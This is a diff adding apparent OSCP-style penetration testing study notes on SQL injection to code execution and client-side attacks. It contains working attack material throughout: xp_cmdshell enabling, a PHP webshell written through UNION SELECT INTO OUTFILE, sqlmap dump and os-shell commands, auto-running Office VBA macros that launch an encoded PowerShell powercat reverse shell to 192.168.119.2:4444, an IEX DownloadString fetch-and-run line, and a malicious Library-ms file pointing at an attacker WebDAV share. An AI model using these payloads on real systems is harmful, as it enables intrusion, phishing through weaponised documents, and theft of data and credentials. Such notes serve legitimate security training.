@@ -629,4 +629,280 @@ http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -
 ```
 look for a `?debug=true` option in source code
 
+## Manual Code Execution
+
+### MSSQL -- xp_cmdshell
+
+first need to enable xp_cmdshell
+
+```
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+```
+
+can use SELECT INTO_OUTFILE for RCE
+combined with php system command
+
+```
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+```
+
+### Automated attacks
+
+use sqlmap
+-u url
+-p parameter we want to test
+```
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+```
+
+can use the --dump param to dump database, creds, etc
+--os-shell provides us with full interactive shell
+
+```
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+```
+
+-r use this file for the request
+```
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+```
+
+when on a wordpress site, running `wpscan` with an api token is a good idea 
+
+zip a file kali
+```
+zip x.zip pentestmonkey_reverse.php style.css
+```
+
+find all text files on a machine
+```
+find / -type f -name 'flag.txt' 2>/dev/null 1>hello
+```
+
+find all files with OS{ in them
+```
+find / -type f -name 'flag.txt' -exec grep -i "OS{" {} + 2>/dev/null 1>hello
+```
+
+## Client-side attacks
+
+
+### Info Gathering
+
+can use 'exiftool' to investigate metadata on docs
+-a display duplicate tags
+-u display unknon tags
+
+```
+exiftool -a -u brochure.pdf
+```
+
+-x flag with gobuster searches for specific extensions
+```
+gobuster dir -u http://192.168.237.197 -x pdf -w /usr/share/dirb/wordlists/common.txt
+```
+
+### Client Fingerprinting
+
+can use canarytokens with a link to get client info
+
+### Exploiting MS Office
+
+user must Enable Editing for the attack to take place
+
+### Installing MS OFfice
+need to use xfreerdp rather than rdesktop to have access
+
+xfreerdp /u:offsec /p:password /v:192.168.20.20
+
+### MS Office Macros
+
+ActiveX Objects -> can access underlying operating system commands. achieved via wscript through windows host shell
+
+```
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+  
+End Sub
+```
+
+need to add autoopen and document_open procedures to snsure run when opened
+
+```
+Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+  
+End Sub
+```
+
+can use powercat to get reverse shell
+Dim -> var declaration
+note that strings can only be 255 chars
+
+powercat download and reverse shell command pre-base64 encoding
+
+```
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+```
+
+python script to split up encoded poewrcat string
+
+```
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
+
+n = 50
+
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+
+```
+
+finally we can finish our macro
+
+```
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+```
+
+then:
+1. download powercat.exe onto local machine
+2. start python server
+3. start nc listening
+4. wait for macro to execute
+
+useful command copy string to clipboard xfreerdp
+```
+echo IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/payload") | Set-Clipboard
+```
+
+use impacket-smbserver to set up a share on kali to share files
+
+```
+impacket-smbserver share /home/kali/offsec/oscp -smb2support -user user -password password
+```
+
+then on windows connect to share
+
+```
+net use X: \\$ip\share /u:user password
+```
+
+### Windows Library Files
+
+.Library-ms extension
+payload in .lnk file
+WebDav share -> allows uses to access and manage files on remote servers
+use wsgidav to setup local http server, can confirm it's running by going to 127.0.0.1 in browser
+
+```
+mkdir /home/kali/webdav
+touch /home/kali/webdav/test.txt
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+
+example template https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+    <name>@shell32.dll,-34575</name>
+    <ownerSID>S-1-5-21-379071477-2495173225-776587366-1000</ownerSID>
+    <version>1</version>
+    <isLibraryPinned>true</isLibraryPinned>
+    <iconReference>imageres.dll,-1002</iconReference>
+    <templateInfo>
+        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+    </templateInfo>
+    <searchConnectorDescriptionList>
+        <searchConnectorDescription publisher="Microsoft" product="Windows">
+            <description>@shell32.dll,-34577</description>
+            <isDefaultSaveLocation>true</isDefaultSaveLocation>
+            <simpleLocation>
+                <url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
+                <serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
+            </simpleLocation>
+        </searchConnectorDescription>
+        <searchConnectorDescription publisher="Microsoft" product="Windows">
+            <description>@shell32.dll,-34579</description>
+            <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
+            <simpleLocation>
+                <url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
+                <serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
+            </simpleLocation>
+        </searchConnectorDescription>
+    </searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+offsec version
+
+isLibraryPinned -> is library pinned in windows explorer
+iconReference -> which icon to use (imageres.dll, -1003 is an img icon)
+folderType -> use Documents guid
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.119.2</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+
+</libraryDescription>
+```
+
 
